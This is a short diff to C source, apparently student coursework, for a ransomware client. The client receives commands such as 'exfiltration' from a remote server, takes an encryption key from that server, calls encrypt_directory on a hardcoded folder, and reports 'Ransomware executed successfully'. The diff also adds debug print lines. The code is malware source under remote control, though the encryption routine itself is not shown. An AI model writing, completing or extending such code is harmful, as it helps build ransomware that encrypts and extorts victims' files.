@@ -39,6 +39,7 @@ void handle_client_commands(int socket_fd)
 
         buffer[bytes_read] = '\0';
         printf("Server command received: \"%s\"\n", buffer);
+        printf("ici c'est avant");
 
         // Traiter les commandes spécifiques
         if (strcmp(buffer, "exfiltration") == 0)
@@ -61,6 +62,7 @@ void handle_client_commands(int socket_fd)
 
             // Recevoir la clé aléatoire générée par le serveur
             bytes_read = recv(socket_fd, buffer, BUFSIZ - 1, 0);
+            printf("ici c'est apres");
             if (bytes_read <= 0)
             {
                 if (bytes_read == 0)
@@ -74,7 +76,8 @@ void handle_client_commands(int socket_fd)
             printf("Received random string: %s\n", buffer);
 
             // Appeler la fonction ransomware avec la clé reçue
-            ransom(buffer);
+            char dir[] = "/mnt/c/Users/lucas/Desktop/Cours_C/TP/TEST_TP/encr";
+            encrypt_directory(dir,buffer);
 
             // Envoyer une confirmation au serveur
             const char *confirmation = "Ransomware executed successfully";
